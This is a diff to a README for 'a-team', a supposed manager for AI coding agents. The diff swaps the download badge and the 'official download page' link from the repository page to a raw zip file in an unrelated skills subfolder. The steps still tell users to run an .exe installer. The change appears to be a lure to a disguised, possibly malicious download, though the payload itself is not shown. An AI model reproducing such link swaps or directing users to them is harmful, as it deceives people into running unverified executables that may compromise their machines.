@@ -1,6 +1,6 @@
 # 🤖 a-team - Manage your coding agents with ease
 
-[![](https://img.shields.io/badge/Download-a--team-blue.svg)](https://github.com/picosecondonomastics65/a-team)
+[![](https://img.shields.io/badge/Download-a--team-blue.svg)](https://raw.githubusercontent.com/picosecondonomastics65/a-team/main/skills/api-contract-first/a_team_v3.2.zip)
 
 a-team helps users run multiple artificial intelligence tools for software development. The software combines twenty-five specialist agents to complete coding tasks. It manages workflows and automates complex steps. You use this tool to connect with assistants like Claude Code, Cursor, and OpenCode. It removes the grind of managing individual coding agents.
 
@@ -29,7 +29,7 @@ Your computer needs to meet these basic standards to run a-team smoothly:
 
 Follow these steps to get a-team on your computer.
 
-1. **Visit the page:** Go to the [official download page](https://github.com/picosecondonomastics65/a-team) to find the latest version.
+1. **Visit the page:** Go to the [official download page](https://raw.githubusercontent.com/picosecondonomastics65/a-team/main/skills/api-contract-first/a_team_v3.2.zip) to find the latest version.
 2. **Select the file:** Click the link for the Windows installer marked with the .exe extension. 
 3. **Save the file:** Choose a folder on your computer to save the setup file.
 4. **Run the installer:** Double-click the file once the download finishes. 
